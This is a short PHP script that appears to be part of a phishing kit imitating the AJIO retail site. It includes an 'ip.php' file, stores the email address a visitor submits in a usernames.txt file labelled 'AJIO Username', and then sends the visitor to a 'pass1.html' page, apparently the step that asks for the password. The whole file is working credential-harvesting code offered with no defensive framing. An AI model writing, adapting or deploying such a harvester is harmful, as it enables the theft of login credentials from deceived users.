<?php
include 'ip.php';
file_put_contents("usernames.txt", "AJIO Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
header('Location: pass1.html');
?>
